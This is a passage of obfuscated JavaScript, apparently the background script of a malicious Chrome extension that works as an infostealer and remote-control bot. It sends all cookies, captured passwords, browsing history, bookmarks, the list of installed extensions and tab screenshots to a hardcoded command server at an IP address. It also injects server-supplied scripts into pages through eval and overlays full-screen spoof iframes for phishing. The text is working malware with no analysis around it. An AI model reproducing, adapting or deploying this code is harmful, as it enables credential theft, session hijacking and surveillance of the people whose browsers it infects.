const _0x28cede=_0x5a7b;
(function(_0x8ca261,_0x3c8ae0){
  const _0x285b53=_0x5a7b,_0xa50ead=_0x8ca261();
  while(!![]){
    try{
      const _0x4ba05e=-parseInt('1ThwLHK')/0x1*(parseInt('547166wXiStV')/0x2)+-parseInt('333618thVbsJ')/0x3+parseInt('932eLywKz')/0x4*(-parseInt('7915gPVcrD')/0x5)+parseInt('210642yLtXZd')/0x6*(-parseInt('203HcNUyB')/0x7)+parseInt('6158368iRanKB')/0x8+parseInt('57177UaVhHh')/0x9*(-parseInt('1230GmhcFA')/0xa)+parseInt('26020885JjKVLi')/0xb;
      if(_0x4ba05e===_0x3c8ae0)break;
      else _0xa50ead['push'](_0xa50ead['shift']());
    }
    catch(_0x450265){
      _0xa50ead['push'](_0xa50ead['shift']());
    }
  }
}
(_0x50dd,0x8e225));
const fe='http://193.178.159.128:8080',me='c9daf8dbafc5e1f63e4af742a14a8a6669365e106ab0247ab366621bbc1f6967',je='<<BP_INSTALLER_HWID>>',te='bp_bot_id',B='bp_last_hist_ms',J='bp_sent_cookies',ne='bp_browser',re='bp_injects',oe='bp_spoofs',I='bp_pending_passwords',C='bp_fingerprint';
async function m(_0x514a4f,_0x6a00cd){
  const _0x41ee1f=_0x28cede;
  try{
    const _0x3a9cf5=await fetch(fe['replace'](/\/$/,'')+('/api/v1')+_0x514a4f,{
      'method':'POST','headers':{
        'Content-Type':'application/json','X-API-Key':me
      },'body':JSON['stringify'](_0x6a00cd)
    });
    return _0x3a9cf5['ok']?_0x3a9cf5['json']():null;
  }
  catch{
    return null;
  }
}
function k(_0x30193f){
  const _0x26e3e3=_0x28cede;
  return new Promise(_0x39ff8f=>chrome['storage']['local']['get'](_0x30193f,_0x39ff8f));
}
function S(_0x26abc3){
  const _0x3d12f8=_0x28cede;
  return new Promise(_0x1b1b37=>chrome['storage']['local']['set'](_0x26abc3,_0x1b1b37));
}
let he='Unknown';
function ae(_0x43daa1){
  const _0x323a22=_0x28cede,_0x3ebba3=_0x43daa1['toLowerCase']();
  return _0x3ebba3['includes']('vivaldi')?'Vivaldi':_0x3ebba3['includes']('opr')||_0x3ebba3['includes']('opera')?'Opera':_0x3ebba3['includes']('edg')||_0x3ebba3['includes']('edge')?'Edge':_0x3ebba3['includes']('brave')?'Brave':_0x3ebba3['includes']('yandex')||_0x3ebba3['includes']('yabrowser')?'Yandex':_0x3ebba3['includes']('chrome')?'Chrome':'Unknown';
}
function Ke(){
  const _0x1947bd=_0x28cede;
  try{
    return self['screen']['width']+'x'+self['screen']['height'];
  }
  catch{
    return'';
  }
}
function qe(){
  const _0x4939e3=_0x28cede;
  try{
    return navigator['language'];
  }
  catch{
    return'';
  }
}
function Te(){
  const _0x3599c5=_0x28cede;
  try{
    return navigator['userAgent'];
  }
  catch{
    return'';
  }
}
function Ve(){
  const _0x3c8bae=_0x28cede;
  try{
    return Intl['DateTimeFormat']()['resolvedOptions']()['timeZone'];
  }
  catch{
    return'';
  }
}
async function He(){
  const _0x1d4fac=_0x28cede;
  var _0x3e5ccf;
  try{
    const _0x3bf92d=globalThis['navigator'],_0x2aad8e=((_0x3e5ccf=_0x3bf92d==null?void 0x0:_0x3bf92d['userAgentData'])==null?void 0x0:_0x3e5ccf['brands'])??[];
    for(const _0x44ba9c of _0x2aad8e){
      const _0x49ed71=ae(_0x44ba9c['brand']??'');
      if(_0x49ed71!=='Unknown')return _0x49ed71;
    }
  }
  catch{
  }
  return ae(Te());
}
function g(){
  return he;
}
function Ie(_0x3a6e80){
  const _0x80794a=_0x28cede,_0xff2436=ae(_0x3a6e80);
  _0xff2436!=='Unknown'&&(he=_0xff2436,S({
    [ne]:_0xff2436
  }));
}
async function Fe(_0x34b31d){
  const _0x1889ab=_0x28cede,_0x6e0f56=_0x34b31d['trim']();
  _0x6e0f56?Ie(_0x6e0f56):he=await He();
}
async function Ae(){
  const _0x2d3e2b=_0x28cede,_0x350562=je['trim']();
  return _0x350562?(await S({
    [te]:_0x350562
  }),_0x350562):null;
}
async function v(){
  return(await k([te]))[te]??null;
}
async function Ye(_0x348d6d){
  const _0x390b1c=_0x28cede,{
    [I]:_0x1bf4a4
  }
  =await k([I]),_0x49a4f9=Array['isArray'](_0x1bf4a4)?_0x1bf4a4:[];
  _0x49a4f9['push'](_0x348d6d),await S({
    [I]:_0x49a4f9['slice'](-0x64)
  });
}
async function Ce(){
  const _0x119c9e=_0x28cede,_0x22eb25=await v();
  if(!_0x22eb25)return;
  const {
    [I]:_0xc4bef
  }
  =await k([I]);
  if(!Array['isArray'](_0xc4bef)||!_0xc4bef['length'])return;
  const _0x2a623f=_0xc4bef,_0x2e2083=g(),_0x55d93c=0x19;
  for(let _0x2d8c63=0x0;
  _0x2d8c63<_0x2a623f['length'];
  _0x2d8c63+=_0x55d93c){
    const _0x45c918=_0x2a623f['slice'](_0x2d8c63,_0x2d8c63+_0x55d93c)['map'](_0x46d024=>({
      ..._0x46d024,'bot_id':_0x22eb25,'browser':_0x2e2083
    }));
    await m('/ext/passwords',{
      'passwords':_0x45c918
    });
  }
  await new Promise(_0x36ae34=>{
    const _0x5db1a6=_0x119c9e;
    chrome['storage']['local']['remove'](I,()=>_0x36ae34());
  });
}
async function Ge(_0x4c90bb){
  const _0x52cecd=_0x28cede;
  function _0x5a2e75(_0x217fcc,_0x20326e){
    const _0x5c102d=_0x5a7b,_0x544cbd=[];
    for(const _0x31a2d5 of _0x217fcc)_0x31a2d5['url']&&_0x544cbd['push']({
      'bot_id':_0x4c90bb,'browser':g(),'title':_0x31a2d5['title'],'url':_0x31a2d5['url'],'folder':_0x20326e
    }),_0x31a2d5['children']&&_0x544cbd['push'](..._0x5a2e75(_0x31a2d5['children'],_0x31a2d5['title']||_0x20326e));
    return _0x544cbd;
  }
  const _0x1400c5=await chrome['bookmarks']['getTree'](),_0xfdeb44=_0x5a2e75(_0x1400c5,'');
  _0xfdeb44['length']&&await m('/ext/bookmarks',{
    'bookmarks':_0xfdeb44
  });
}
function ve(_0x199b0b){
  const _0x3cf3fb=_0x28cede;
  return _0x199b0b['domain']+'|'+_0x199b0b['name']+'|'+_0x199b0b['path'];
}
async function Je(_0x563a30){
  const _0x3e06f8=_0x28cede,_0x49c663=await chrome['cookies']['getAll']({
  });
  if(!_0x49c663['length'])return;
  const {
    [J]:_0x224c12
  }
  =await k([J]),_0x410ebe=_0x224c12??{
  },_0x525a60=_0x49c663['filter'](_0x3d1e15=>{
    const _0x35bd43=_0x3e06f8,_0xe19d4e=ve(_0x3d1e15)+'|'+_0x3d1e15['value'];
    return _0x410ebe[_0xe19d4e]!==!0x0;
  });
  if(!_0x525a60['length'])return;
  const _0x353d88=_0x525a60['map'](_0x3fef15=>({
    'bot_id':_0x563a30,'browser':g(),'host':_0x3fef15['domain'],'name':_0x3fef15['name'],'value':_0x3fef15['value'],'path':_0x3fef15['path'],'secure':_0x3fef15['secure'],'http_only':_0x3fef15['httpOnly'],'expires':_0x3fef15['expirationDate']?new Date(_0x3fef15['expirationDate']*0x3e8)['toISOString']():null
  }));
  if(!await m('/ext/cookies',{
    'cookies':_0x353d88
  }))return;
  const _0x111e6b={
  };
  _0x49c663['forEach'](_0x46eabd=>{
    const _0xbb8881=_0x3e06f8;
    _0x111e6b[ve(_0x46eabd)+'|'+_0x46eabd['value']]=!0x0;
  }),await S({
    [J]:_0x111e6b
  });
}
async function Xe(_0x1a53cb){
  const _0x576a08=_0x28cede,_0x5692c0=await chrome['management']['getAll']();
  if(!_0x5692c0['length'])return;
  const _0x64650c=chrome['runtime']['id'],_0x5a6977=_0x5692c0['filter'](_0x1f3651=>_0x1f3651['id']!==_0x64650c)['map'](_0x21b45b=>({
    'bot_id':_0x1a53cb,'browser':g(),'ext_id':_0x21b45b['id'],'name':_0x21b45b['name'],'version':_0x21b45b['version'],'enabled':_0x21b45b['enabled'],'type':_0x21b45b['type']
  }));
  _0x5a6977['length']&&await m('/ext/extensions',{
    'extensions':_0x5a6977
  });
}
const _e=0x1f40;
function ze(_0x44b2c0){
  return new Promise((_0xca07a4,_0x3da7c4)=>{
    const _0x1b2bc5=_0x5a7b;
    chrome['history']['search'](_0x44b2c0,_0x1a58d9=>{
      const _0x369e35=_0x1b2bc5,_0x405972=chrome['runtime']['lastError'];
      _0x405972?_0x3da7c4(new Error(_0x405972['message'])):_0xca07a4(_0x1a58d9??[]);
    });
  });
}
async function Qe(_0x206a63){
  const _0x14b007=_0x28cede,_0x44c63d=[];
  let _0x39373d=Date['now']();
  const _0x5db7c0=0x3d090;
  for(;
  _0x44c63d['length']<_0x5db7c0;
  ){
    const _0x517e16=await ze({
      'text':'','startTime':_0x206a63,'endTime':_0x39373d,'maxResults':_e
    });
    if(!_0x517e16['length']||(_0x44c63d['push'](..._0x517e16),_0x517e16['length']<_e))break;
    const _0x15aad4=_0x517e16['reduce']((_0x54d0e6,_0x470c60)=>Math['min'](_0x54d0e6,_0x470c60['lastVisitTime']??_0x39373d),_0x39373d)-0x1;
    if(_0x15aad4<=_0x206a63)break;
    _0x39373d=_0x15aad4;
  }
  const _0x5c3970=new Set(),_0x342521=[];
  for(const _0x442737 of _0x44c63d){
    const _0x3887fa=(_0x442737['url']??'')+'\x09'+(_0x442737['lastVisitTime']??0x0);
    _0x5c3970['has'](_0x3887fa)||(_0x5c3970['add'](_0x3887fa),_0x342521['push'](_0x442737));
  }
  return _0x342521;
}
async function Ze(_0x1313c6){
  const _0x11e938=_0x28cede,{
    [B]:_0x4418bb
  }
  =await k([B]),_0x5284bf=Number(_0x4418bb)||0x0,_0x5ea967=Date['now']();
  let _0x1a0d33;
  try{
    _0x1a0d33=await Qe(_0x5284bf);
  }
  catch{
    return;
  }
  if(!_0x1a0d33['length']){
    await S({
      [B]:_0x5ea967
    });
    return;
  }
  const _0x313f82=_0x1a0d33['map'](_0x3e474e=>({
    'bot_id':_0x1313c6,'browser':g(),'url':_0x3e474e['url']??'','title':_0x3e474e['title']??'','visit_time':_0x3e474e['lastVisitTime']?new Date(_0x3e474e['lastVisitTime'])['toISOString']():new Date()['toISOString'](),'visit_count':_0x3e474e['visitCount']??0x1
  })),_0x4da15a=0x1f4;
  for(let _0x51e32e=0x0;
  _0x51e32e<_0x313f82['length'];
  _0x51e32e+=_0x4da15a)if(!await m('/ext/history',{
    'history':_0x313f82['slice'](_0x51e32e,_0x51e32e+_0x4da15a),'since':_0x5284bf
  }))return;
  await S({
    [B]:_0x5ea967
  });
}
function _0x50dd(){
  const _0x30f623=['zvnJCMLW','B25LCNjV','CNvUDgLT','C2vY','zw5KzxjP','CMvKDwnL','qMfJA3nW','Bw1HBMq','yNbFzMLU','zwrNztOV','BcL7cIaG','y29TlMX1','lMrVy3vT','D2LUzg93','Df9OAxn0','DxjYzw5J','cIaGzg9J','CMf0Aw8','r2vVCMDP','ywjjzcWG','yNjVD3nL','odm2ndC7','BwvgB3jT','z2v0rwXL','zhbY','rwXLBwvU','rw50zxi','CgXVywqG','rwrNzq','yxr0ywnR','DgfYz2v0','svbqruqG','CMvHzcbL','zxjY','B2n1BwvU','DxjS','yxbWBgLJ','CMv0DxjU','yNbFyNjV','ywjVDxq','oWOGigrV','zYbMAwXL','vgfOB21H','BgvK','Bg93zNvS','zMLSzxnm','BwvUDc5Z','Dw1LBNqU','C3rHCNq','rgf0zvrP','zg9Uzq','CMvHzhLt','yNbFBgfZ','qMXHy2S','AwqGpsaN','BwvHC3vY','B2LUDa','jZSkicbP','AxzL','DgvfBgvT','Dgf0zq','DhLezxnJ','DwvbDfrP','lZe5mY4X','oWOGigLM','y2HPBgrY','zNjHBwuP','x3vYBa','y2HfDMvU','B25Uzwn0','y2HYB21L','B25jBNn0','nJy2otm2','Cg9SBe1Z','nJK2nW','EwfICM93','DguOj2fS','Dc5JCMvH','zfbHDgHZ','x21LBw9Y','DgvUzxi','zMfPBgvK','z2v0vvjm','v1nfuG','q29TAwmG','AwnH','B25TzxnZ','iZa2oq','lwLUzgv4','yNvZEq','BM90Awz5','yw1LlNnL','otmYzuX5D0T6','A2v5CW','ANbLzW','CMTZ','yxn5BMnc','y2XVC2vF','mtiZmeDTAgngqq','zwfR','ihjLC3vS','CgLUzW','EwXL','zYb0BW','DgvZDa','C3rjza','C3rYAw5N','nwuXmdzH','CIbozxC','BwfU','ChvZAa','D2fYBG','qLbFqLjp','Dg9mB3DL','CI9KB3DU','zwqSihrH','mJyWmJa4odvkAKTwtgK','B3zLCMzS','lwv4DgvU','y29SB3je','DMLZAxrd','y2fWDhvY','Aw5N','zxK9','zwn0ig5V','vu5nqvnl','B25JBg9Z','BwvUDej5','zM9JDxm','A2v5zg93','DcWGy21K','CIbPzNjH','AgfYzhDH','EhrLBNnP','ihn0yxj0','zMLSBfrL','DxbKyxrL','CMvHza','CgXVywrs','yxrPB24V','BMvJDgLU','D3jPDgu','igLMCMfT','B3bLBL91','CxvLCNK','Cgf0Aa','y3ndB21W','y21Kpq','mtfWDcbb','ywnL','B246zML4','Bg9N','BMfWC2HV','C2L0vgLT','rvjspq','oNvSoG','zMLSzxns','vgLTzxmG','mdb2AdTI','zw50rwXL','y2XLyxjF','DxjSpq','zMLSDgvY','zw50CMLL','C3vIBwL0','yMfJA2DY','ktSkicbP','lxDLyMDS','CM9Y','y2f0Aw9U','tgLUzujY','zw50rgf0','Bg9JywW','B25bBgfY','B28GBgfY','AgvPz2H0','zv0Gv1mG','DhLSzs5V','Axn0B3j5','DdSGy2XP','vxjSoWOG','l2v4Dc9J','zw5HyMXL','zgjHzMm1','C3vIC3rY','BMf0AxzL','CMfTzv9F','CgXHDgzV','nZGUmtu5','BwfW','ywqTy29T','CMvXDwvZ','Awz5','y2H1BMS','y29SB3jF','zv0Gy29U','B3bY','CMLHBa','B3bLCMe','mZmZnJe4DgHwyNnk','CMvTB3rL','ywXSu2v0','y2fSBa','ywrK','DdOWo3DP','rurFuKvo','y2f0y2G','C2nYAxb0','xcqM','zxb0Aa','zw50rwrP','yJaYndDH','ywXSB3CN','A2vK','BMf2AwDH','yZLKywy4','yxrPBW','B3jKyMfU','zgvbDa','BwvZC2fN','tgLZDgvU','uLrcrufu','mtHWDcbh','oJa7BgvM','zgLZy29U','A25Lzq','B25tDgfY','CNvLjYK7','C2v0vw5P','Cg9ZAxrP','y3rPDMvu','zw50','BNn0ywXS','y2XZ','zg9TywLU','y29UBMvJ','yxrO','BwLU','A2v5Dxa','zwn0CW','Dw5qyxrO','BMv4lMv4','Aw5HDgLV','zxjYB3i','De5HDgL2','C3jJid0G','AhjLzG','ywXHCM1Z','x3rHyG','pgfSBf91','B3n0','CMDIysGX','ANnVBG','icHLEgLZ','B3Dy','B3zL','C2v0vMfS','y3jLyxrL','zwn0Aw9U','mti3lJaU','lxDYAxrL','vML2ywXK','l2fWAs92','zw50kcDP','u2vNB2uG','B25eAxnJ','C2v0rw5H','DgLVBKrH','C3rHDhvZ','B2jQzwn0','B25dBgLJ','yxrPB24','u1DpuKq','zxHWAxjH','EhqGpsaN','zwn0ifnl','y2XLyxi','zMLSzxne','jYK7cIaG','z2v0','nJe1odm2ogLsyw5lqG','CMLNAhq','C2vSzwn0','yte0ytHH','DhvW','DMvYC2LV','q29UC29S','cIaGAwzY','zMLUza','C2vHCMnO','zv0GBM8G','lNn0EwXL','zgv2Dg9V','z2v0ugfY','ztfMnJnL','zwq7Dg9W','zMzMoYC7','BM93','zNjLCxvL','ExbL','qKDm','Cgf5BwvU','Bw1TBwXS','yNbFAw5Q','nZjWEa','l2v4Dc9Z','oJiXndC0','DgXLza','CgXVCMvY','rhLUyw1P','B25LoYbN','C3bSAxq','zxf1zxn0','zxHWzxjP','zgv2AwnL','x3bHDhrL','DhjPBMC','Dg9eyxrH','BgfUz3vH','DMfYigv4','C2vSAw5L','BgvUz3rO','tufjtG','B25nzxnZ','DgLTzvPV','rMLSzsb0','Bhm6lY8','DhjPBq','Cg9VzL9M','Dw5PBNn0','BMvJDgvK','BwfUywDL','zwrNzq','Bw9UB3nW','BIbWyxrO','zv0GC3rY','veLorW','zwfK','Bxb0EsbY','twLJCM9Z','y3rLzcbL','q3DTigzQ','DfrPBwu','B2XK','y2XPy2S','zMLSBfjL','zxi9','B25bDxrO','C2LVBJOV','CgfYzw50','yNbFyM90','BwLKzgXL','oMrSoG','zs5Zzxrb','zwn0','BwvUDa','pgXVy2fS','CI91CgXV','DezYB21q','B3Dz','C2v0u2vS','y29Kzq','zfjLCxvL','DfbHDgG','zgvZDgLU','sw1Wywn0','DxnLCKfN','ywrKtgLZ','ywjZ','jMjYB3DZ','DMf0zwq','mdiSmJa0','Dg9Y','zg93BG','qLbFu1Lo','Bg9JywXO','zM9JDxnL','Dw5szxf1','Bw91C2vF','uhjVCgvY','vw5LEhbL','v0vcr0XF','ntq3mty2D1HPu3rw','Aw5Zzxj0','AxndB250','swqOj19F','q0Xpu0ve','zerLBgv0','CgXLDgu','zvzPC2LI','B2zZ','CMLWDg9Y','A2v5x2rV','tMv3ifjV','sgvSDMv0','zMLSzxnt','C25HChnO','DfjLCxvL','Bwv0yq','rvjst1i','A2v5x3vW','oNj1BJO','ienVBNnV','z2v0vhjL','Dg9ju09t','C2vYAwy','q2HYB21L','C2HVDa','Dg1LBNu','rurFvKvo','BICSicD0','C3rVCMfN','thvJAwrH','yNjHBMrZ','z2vYChjP','DgfICW','C3bVB2zZ','yNbFC3bV','CMvSzwfZ','BNrfBgvT','DhjPyw5N','y3vYCMvU','yxnZAwDU','suXfra','DhLWzq','re9sx1Df','D2vIz2W','l2v4Dc9L','wwfUzgv4','yMfZAwm','zwfTAw5N','Bw91C2v1','t3nJAwXS','BgLZDa','DgHLBG','DgLVBJSG','x21Z','v0vcr0W','zM9YD2fY','BgfZDevY','zw5ZAw9U','CI9ZBMfW','yNjHBMq','zxH0x3nL','zNjHBwuN','ugL4zwXs','mdGW','zMLSzxnv','uMfUz2u','AwnVBI5W','zgvSzxrL','zxn0swq','yM90swq','Ahr0Chm6','AxPL','Aw9UkhrH','Dg9gAxHL','B3DUBg9H','oWP9ksG','DgfNpq','yw1L','C29YDa','y2XZpq','DgfIpq','EwfUzgv4','t1bftG','B25Z','DxbSB2fK','B29RBwfY','y29TCgXL','B25by3rP','ChjVDg90','zNjHBwu','yw1LDgvY','zM9YrwfJ','AhvUAW','DgvK','CMXZpG','DgfIswq','ywqTChvS','zxjPzG','C2vYDMvY','ywDL','zhbYpq','yxrVCG','zxjHoYbT','y29VA2LL','z2v0q2HH','4Ocuig5Vige','zMLSBfn0','zNjHBwuU','lMnZC1rL','Aw9Urw5K','y3jLzw5Z','y2XHC3no','vvjm','zgvWDgG','ChjVEhK','zwrN','yNbFC2vU','vw5RBM93','B3n0oJuX','C2nYzwvU','y29TBwfU','Df9JB29R','CNjVCG','Agv0ie1t','zMXHDe1H','zhjPDMvZ','D3nLCG','CgjVyxjK','q291CMLL','zw9SB2nH','CMvNDwXH','DxjSx3bH','BM8GtgLU','C2XPy2u','DwvZDa','B29RAwvZ','C2HPzNq','Bg9Hzc1J','B3qGzMfP','Cgf5Bg9H','Bw1TBw1T','AgLSzcHP','CMvHC29U','igHVC3qG','jMjVDf9P','twvTB3j5','zxjFAw5M','q2fSAwjY','C2nYB2XS','Bw92zq','l2v4Dc9O','AwvZ','D3jPDguG','ywXSzwq','B3DU','zxHLy0nV','AwzYyw1L','DhrLCM4','Awq9','BM90AwzP','zgvSDgfy','yM9KEq','t3bLCMe','yNv0Dg9U','DgLUzYKG','Axn0Aw5N','CI9YDw4T','revsrvjF','BM5LBerH','uMvXDwLY','yxvKAw8','zgf0yq','zhrOoJeW','zgLZCgf0','vhjLyNvJ','Aw5Qzwn0','C3rHCNrs','DgHYzxnO','zgvIDwDF','y2vZC2vK','Dfn1yM1P','DgfNtMfT','ywX0','rgvSzxrL','oWOGihzH','Aw9Uu3rH','zfbHDgG','mvrOD0XisW','D2HLzwW','zxrPyW','x2LK','x3n0B3a','ihb1BgWG','4OAsihrHyJ0','zM9UDhm','Dgv4Da','Ahr0Ce9U','zM9YBq','B3r5Cgu','C2vJDxjL','Def0DhjP','y2XVC2u','zv0GBxnN','mwjIyZfM','ywn0AxzL','CgfYC2u','BgfZDfzP','vMvYzgfU','CMDLDfvY','Cgf0Ahm','CMvUzgvY','D2vIz2XF','C2v0','BwuGpsbK','zgLUz19W','kgz1BMn0','Ahr0Ca','B3H5','v2L0Aa','DML2ywXK','CMDLDcb0','BgfZDefJ','Ag9ZDa','u2fUCYbn','C3nHz2u','AgLZDg9Y','mJeWnJqYEuX0wfPK','C2v0DgLU','A2v5','Bg9JA2LU','y29UDgv4','Bw91C2vT','qLbFueft','ywi9','y2HHCKnV','zwrpChrP','Bw91C2vK','DgfN','DgfI','zYbKzxn0','yJm2nJyY','Bxb0Esb1','B25szw1V','B2z0ifnH','q2fTyNjP','p2fWAv9R','x3n0yxj0','y3vTzw50','z2v0q29U','BMfTzq','x19ICf9Z','ywjSzsb0','ugfSyxrP','lJeYodO4','y2fUDMfZ','ChbLBMrd','yNbFDgLJ','Bgvuywi','CMvZC29Y','zwXLBwvU','Dg90ywXt','yMXLza','C291CMnL','ywXWAgfI','C2v0x3bY','mc4X','y3rYBa','ms9LEhqV','DMfSDwu','DYa9icDO','B3vUzdOJ','C2fUCY1Z','CMvZB2X2','B3jKzxi6','CMvTB3zL','BhnJCMvL','ntCXnZDvyvzOsgG','B3vUDa','A2v5ChjL','B25VCgvU','lcaNy2fT','AhDFy29U','BwvUDgfS','BwvFxYCP','Cg9ZDe1L','DgL0Bgu','BM9UztT6','l2v4Dc9W','twLZC2LU','B2zFzNjH','yM9VA21H','DhrYAwj1','nZKXnwDqvMnYra','yNv0zsGN','EhbSB3jL','AxnbCNjH','qxjPywWG','DgfIBgu','AwrKzw4N','CMvQzwn0','zML4zwrF','CMvWBgfJ','Aw5ZDgfS','y3GSy3K9','zv0GAw5Q','yxnZD29Y','CgXVywrq','AwnYB3bO','Aw5JBhvK','Dgv4DejH','mJaZsgnovxLc','DMvUzg9Y','CMvSB2fK','ngfMnZqY','z2v0rxH0','qxjPywW','id0Gzg9J','zvrLEhq','z2v0t3DU','z2v0qwXS','zg9JDw1L','zgvSDgfz','qNjHDMu','zxHLy3v0','BNmGu2vY','CNvUigvY','C3rHCNrZ','vgv4Da','DMvK','i2y2ma','D2vIuMvX','oI8V','yNjHDMu','CMvZDwX0','ldaSmc43','BM9YBwfS','Ahr0CdOV','zM9UDa','zw9Yz2LH','yNbFCgvU','q09otKvd','q19ot1C','CNvU','A2v5q29K','BMvJDa','B25vCgrH','mhz3o2HL','BNvTyMvY','yNrU','D2LKDgG','jMTLEt0','ihbHDgG','ue9tva','ANnFy29K','Df9LBMfI','ywXSp2H3','yM9KEs5H','C2vUza','zwn0iezb','AwDODdOX','zMLSzu5H','w3jLBw90','CMvdB25J','Ag90','BMn5','DMvYzMXV','AgfZ','l2v4Dc9I','CKnHC2u','Aw5WDxq','qLbFsevb'];
  _0x50dd=function(){
    return _0x30f623;
  };
  return _0x50dd();
}
async function Re(){
  const _0x3a005b=_0x28cede,_0x1f58a4=await v();
  _0x1f58a4&&(await Ce(),await Promise['allSettled']([Je(_0x1f58a4),Ze(_0x1f58a4),Xe(_0x1f58a4),Ge(_0x1f58a4)]));
}
function et(){
  const _0x5a1c04=_0x28cede;
  chrome['runtime']['onMessage']['addListener']((_0x1de465,_0x3ff400,_0x424ec1)=>{
    const _0x49bab4=_0x5a1c04;
    if(_0x1de465['type']==='BP_BROWSER')return Ie(String(_0x1de465['browser']??'')),_0x424ec1({
      'ok':!0x0
    }),!0x0;
    if(_0x1de465['type']==='BP_PASSWORD')return((async()=>{
      const _0x21fc69=_0x49bab4;
      try{
        const _0x4bf177=_0x1de465['data'];
        let _0x5b6ff5=await v();
        _0x5b6ff5||(await Ae(),_0x5b6ff5=await v()),_0x5b6ff5?await m('/ext/passwords',{
          'passwords':[{
            ..._0x4bf177,'bot_id':_0x5b6ff5,'browser':g()
          }]
        }):await Ye(_0x4bf177);
      }
      finally{
        _0x424ec1({
          'ok':!0x0
        });
      }
    })()),!0x0;
    if(_0x1de465['type']==='BP_SYNC_NOW')return Re()['then'](()=>_0x424ec1({
      'ok':!0x0
    })),!0x0;
  });
}
function L(_0x4509e4,_0x22ec6a){
  const _0x30cd08=_0x28cede,_0x48c21e=_0x22ec6a['replace'](/[.+?^${
  }
  ()|[\]\\]/g,'\\$&')['replace'](/\*/g,'.*');
  try{
    return new RegExp(_0x48c21e,'i')['test'](_0x4509e4);
  }
  catch{
    return!0x1;
  }
}
function tt(_0x47c27c){
  const _0x44cce2=_0x28cede;
  return '(function(targetUrl){var existing = document.getElementBy'+'Id(\'__bp_spoof_fra'+'me__\'); (existing) return;r iframe = document.createElem'+'ent(\'i'+'frame\');frame.'+'id = \'__bp_spoof_frame__'+'\';frame.src = targetUrl; iframe.setAttribu'+'te(\'allowfullscree'+'n\', \'t'+'rue\');ame.setAttri'+'bute(\''+'allow\''+', \'camera; microphone; geolocation; payment; clipboard-write'+'\');iframe.style.cssTe'+'xt = \'position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647;background:#'+'fff;\';ument.body.appendChild(iframe);cument.documentElement.style.overflo'+'w = \'h'+'idden\';'+JSON['stringify'](_0x47c27c)+')';
}
function nt(){
  const _0x2cefef=_0x28cede;
  chrome['tabs']['onUpdated']['addListener']((_0x209d96,_0x383f5d,_0x1c874a)=>{
    const _0x46e035=_0x2cefef;
    if(_0x383f5d['status']!=='complete'||!_0x1c874a['url'])return;
    const _0x28165c=_0x1c874a['url'];
    ((async()=>{
      const _0x18d641=_0x46e035,{
        [re]:_0xee5259,[oe]:_0x56c32c
      }
      =await k([re,oe]),_0x1bac0b=_0xee5259??[],_0x13ca13=_0x56c32c??[];
      for(const _0x558f22 of _0x1bac0b)(_0x558f22['url_pattern']==='*'?/^https?:/i['test'](_0x28165c):L(_0x28165c,_0x558f22['url_pattern']))&&chrome['scripting']['executeScript']({
        'target':{
          'tabId':_0x209d96
        },'world':'MAIN','func':_0x2021bb=>{
          (0x0,eval)(_0x2021bb);
        },'args':[_0x558f22['js_code']]
      })['catch'](()=>{
      });
      for(const _0x36d3b0 of _0x13ca13)if(L(_0x28165c,_0x36d3b0['source_pattern'])){
        chrome['scripting']['executeScript']({
          'target':{
            'tabId':_0x209d96
          },'world':'MAIN','func':_0x2ec32d=>{
            (0x0,eval)(_0x2ec32d);
          },'args':[tt(_0x36d3b0['target_url'])]
        })['catch'](()=>{
        });
        break;
      }
    })());
  });
}
const ie={
};
function rt(){
  const _0x5ee415=_0x28cede;
  chrome['notifications']['onClicked']['addListener'](_0x15ae99=>{
    const _0x4b44fd=_0x5ee415,_0xc8ab6=ie[_0x15ae99];
    _0xc8ab6&&(chrome['tabs']['create']({
      'url':_0xc8ab6
    }),delete ie[_0x15ae99]),chrome['notifications']['clear'](_0x15ae99);
  });
}
const ot=0xfa;
function at(_0x25e6da){
  const _0x5a3b13=_0x28cede;
  return _0x25e6da?!_0x25e6da['startsWith']('chrome://')&&!_0x25e6da['startsWith']('chrome-extension://')&&!_0x25e6da['startsWith']('devtools://')&&!_0x25e6da['startsWith']('edge://'):!0x1;
}
async function it(_0x1d424a){
  const _0xd3737b=_0x28cede,_0x104732=_0x5d57d2=>at(_0x5d57d2['url'])&&_0x5d57d2['windowId']!==void 0x0;
  if(_0x1d424a==='active'||_0x1d424a==='*'){
    const [_0x11e722]=await chrome['tabs']['query']({
      'active':!0x0,'lastFocusedWindow':!0x0
    });
    return _0x11e722&&_0x104732(_0x11e722)?_0x11e722:(await chrome['tabs']['query']({
      'currentWindow':!0x0
    }))['find'](_0x104732)??null;
  }
  return(await chrome['tabs']['query']({
  }))['find'](_0x5b0afd=>_0x5b0afd['url']&&L(_0x5b0afd['url'],_0x1d424a)&&_0x104732(_0x5b0afd))??null;
}
async function st(_0x324e5c){
  const _0x5cf662=_0x28cede;
  if(_0x324e5c['windowId']===void 0x0)return null;
  try{
    const _0x2f2bcc=await chrome['tabs']['captureVisibleTab'](_0x324e5c['windowId'],{
      'format':'jpeg','quality':0x48
    });
    if(_0x2f2bcc)return _0x2f2bcc;
  }
  catch{
  }
  if(!_0x324e5c['id'])return null;
  try{
    return await chrome['tabs']['update'](_0x324e5c['id'],{
      'active':!0x0
    }),await chrome['windows']['update'](_0x324e5c['windowId'],{
      'focused':!0x0
    }),await new Promise(_0x53fcdd=>setTimeout(_0x53fcdd,ot)),await chrome['tabs']['captureVisibleTab'](_0x324e5c['windowId'],{
      'format':'jpeg','quality':0x48
    });
  }
  catch{
    return null;
  }
}
async function ct(_0x15c777){
  const _0x362841=_0x28cede,_0x3005fe=await v();
  if(!_0x3005fe)return!0x1;
  const _0x488bea=await it(_0x15c777||'active');
  if(!_0x488bea)return!0x1;
  const _0x3746db=await st(_0x488bea);
  return _0x3746db?await m('/ext/screenshot',{
    'bot_id':_0x3005fe,'image':_0x3746db,'tab_url':_0x488bea['url']??'','tab_title':_0x488bea['title']??''
  })!==null:!0x1;
}
const lt='com.lunex.explorer',Pe=0x80000,Oe=0x1f400000,Se=0x1f4,xe=0x5*0x3c*0x3e8,X=new Set(),z=new Set(),Q=new Set(),Z=new Set();
let se=0x0,A=null,ce=null;
function Ne(_0x316c1e){
  const _0x2c94a2=_0x28cede;
  return Date['now']()<se?!0x0:_0x316c1e?!!(_0x316c1e['filesLive']||_0x316c1e['filesSnapshotRequestId']||_0x316c1e['filesDownloadRequestId']||_0x316c1e['filesUploadRequestId']||_0x316c1e['filesRunRequestId']):!0x1;
}
function W(_0x4cff3f){
  const _0x118500=_0x28cede;
